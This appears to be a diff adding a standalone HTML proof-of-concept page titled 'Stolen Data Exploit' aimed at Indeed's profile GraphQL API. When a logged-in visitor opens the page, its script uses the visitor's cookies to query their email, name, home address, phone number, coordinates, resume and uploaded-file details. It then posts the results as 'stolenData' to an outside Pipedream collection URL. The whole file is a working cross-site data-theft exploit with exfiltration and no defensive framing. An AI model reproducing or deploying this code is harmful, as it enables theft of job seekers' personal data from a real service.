@@ -1,0 +1,154 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stolen Data Exploit</title>
+</head>
+<body>
+  <h1>Exploit Running...</h1>
+  <script>
+    // Send GraphQL request to Indeed's profile API (authenticated)
+    fetch("https://profile.indeed.com/graphql", {
+      method: "POST",
+      credentials: "include",  // Sends cookies with the request
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        query: `query ResumeSection($includeAdminNames: Boolean = false) {
+          currentUser {
+            account {
+              id
+              ... on PassportAccount {
+                emailAddress
+                isConfirmed
+                accountId
+                __typename
+              }
+              __typename
+            }
+            __typename
+          }
+          jobSeekerProfile {
+            profile {
+              ...profileContactInfo
+              resume {
+                ...resumeContactInfo
+                ...resumeSectionFields
+                __typename
+              }
+              ...fileInformation
+              fraudMetadata {
+                state
+                __typename
+              }
+              __typename
+            }
+            __typename
+          }
+        }
+
+        fragment profileContactInfo on JobSeekerProfile {
+          accountKey
+          defaultInfo {
+            contactInformation {
+              firstName
+              lastName
+              location {
+                address
+                city
+                admin1
+                admin1Name @include(if: $includeAdminNames)
+                admin3Name @include(if: $includeAdminNames)
+                admin4Name @include(if: $includeAdminNames)
+                postalCode
+                country
+                unknownLocation
+                formattedLocation
+                latitude
+                longitude
+                __typename
+              }
+              phoneNumber
+              __typename
+            }
+            __typename
+          }
+          __typename
+        }
+
+        fragment resumeContactInfo on JobSeekerProfileResume {
+          id
+          locale
+          firstName
+          lastName
+          firstNameFurigana
+          lastNameFurigana
+          phoneNumber
+          showPhoneNumber
+          headline
+          location {
+            address
+            address2
+            city
+            admin1
+            admin1Name @include(if: $includeAdminNames)
+            admin3Name @include(if: $includeAdminNames)
+            admin4Name @include(if: $includeAdminNames)
+            postalCode
+            country
+            formattedLocation
+            unknownLocation
+            latitude
+            longitude
+            geocodePrecision
+            __typename
+          }
+          resumeType
+          wordCount
+          employmentEligibilities {
+            employmentEligibility
+            id
+            __typename
+          }
+          __typename
+        }
+
+        fragment resumeSectionFields on JobSeekerProfileResume {
+          id
+          state
+          resumeType
+          dateModified
+          wordCount
+          __typename
+        }
+
+        fragment fileInformation on JobSeekerProfile {
+          fileInformation {
+            id
+            clientApp
+            extension
+            fileName
+            fileType
+            mediaType
+            tags
+            uploadTimestamp
+            __typename
+          }
+          __typename
+        }`
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      // Send the stolen data to Pipedream
+      fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net/", {  // Replace with your Pipedream URL
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ stolenData: data })
+      });
+    })
+    .catch(console.error);
+  </script>
+</body>
+</html>
